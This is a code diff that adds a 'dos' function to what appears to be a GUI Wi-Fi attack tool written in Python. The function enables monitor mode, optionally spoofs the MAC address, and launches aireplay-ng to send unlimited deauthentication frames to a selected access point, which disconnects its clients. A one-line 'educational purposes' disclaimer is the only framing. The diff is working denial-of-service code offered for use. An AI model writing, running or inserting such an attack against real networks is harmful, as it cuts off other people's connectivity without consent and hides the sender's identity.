@@ -386,3 +386,55 @@ def update_progress(T, value):
     # T.delete("end-1c linestart", "end")
     write_progress(T, value)
     T.configure(state="disabled")
+
+
+# DOS - dirty attack :) only for educational purposes :D
+def dos(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click):
+    
+    attack_launched(tree, scan_btn, stop_attack_btn)
+
+    tools.addToolInfo(T, "Executing DOS operation...\n\n")
+    monitor_interface = tools.enable_monitor(interface)
+    tools.addToolInfo(T, str(interface) + " is now in monitor mode, at " + monitor_interface + "\n\n")
+
+    # Spoof mac ?
+    if globs.spoof_mac.get() == 1:
+        spoof(monitor_interface)
+        tools.addToolInfo(T, "Mac of " + monitor_interface + " is now spoofed to a random mac for this attack.\n")
+
+    current_item = tree.item(tree.focus())
+
+    # TODO some bug, will fix later
+    if len(current_item['values']) == 0:
+        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
+        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
+        tools.disable_monitor(monitor_interface)
+        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
+        return 0
+
+    mac, wifi_name, channel = current_item['values'][3], current_item['values'][0], current_item['values'][5]
+
+    # Airodump here is just a lazy way to set channel of device :D
+    airodump = subprocess.Popen(('airodump-ng --bssid ' + mac + ' -c ' + str(channel) + ' ' + monitor_interface).split(" "))
+    time.sleep(2)
+    airodump.kill()
+    aireplay = subprocess.Popen(('aireplay-ng -0 0 -a ' + mac + ' ' + monitor_interface).split(" "))
+    
+    tools.addToolInfo(T, "Sending unlimited de-authentications to " + str(wifi_name) + "...\n")
+            
+    stopped = False
+    while not stopped:
+        root.update()
+        # clicked stopped attack button
+        if globs.stop_attack: 
+            globs.stop_attack = False
+            aireplay.kill()
+            airodump.kill()
+            tools.addToolInfo(T, "Stopped DOS attack.\n\n")
+            stopped = True 
+            break
+
+    tools.disable_monitor(monitor_interface)
+    tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
+
+    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
